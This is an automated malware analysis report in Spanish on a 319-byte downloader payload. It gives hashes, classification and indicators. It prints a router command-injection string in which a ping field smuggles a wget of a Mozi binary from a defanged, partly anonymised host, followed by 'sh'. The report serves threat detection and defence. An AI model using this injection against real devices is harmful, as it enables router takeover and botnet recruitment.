# 🧬 Payload Analysis

`5fc7b518758dd12ad52ff4cef0e8b75a802beb8ad73ad375e948863d1f423ba6`

## 📌 Resumen

Texto ASCII de 319 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `Mozi.m+-O+-` en `hxxp://27.215.47.XXX:58445/Mozi.m+-O+-`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `wget hxxp://27.215.47.XXX:58445/Mozi.m -O ->/tmp/gpon80`
2. `sh` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/5fc7b518758dd12ad52ff4cef0e8b75a802beb8ad73ad375e948863d1f423ba6.md](../../../../../malware-like/oraculo/downloader/5fc7b518758dd12ad52ff4cef0e8b75a802beb8ad73ad375e948863d1f423ba6.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:29:35.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `5fc7b518758dd12ad52ff4cef0e8b75a802beb8ad73ad375e948863d1f423ba6`
- **SHA1:** `7fb7a5f6c64c50edd1ec3dce62934dbd848c8abe`
- **MD5:** `0d0c8aa8c735eee93cbad7acc8b0c845`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 319 B |
| Entropía | 5.43 |
| Strings | 8 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://27.215.47.XXX:58445/Mozi.m+-O+->/tmp/gpon80;sh
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://27.215.47.XXX:58445/Mozi.m+-O+- | strings |
| ip | 27.215.47.XXX | static_analysis |
| command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://27.215.47.XXX:58445/Mozi.m+-O+->/tmp/gpon80;sh | strings |
| hash | 5fc7b518758dd12ad52ff4cef0e8b75a802beb8ad73ad375e948863d1f423ba6 | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
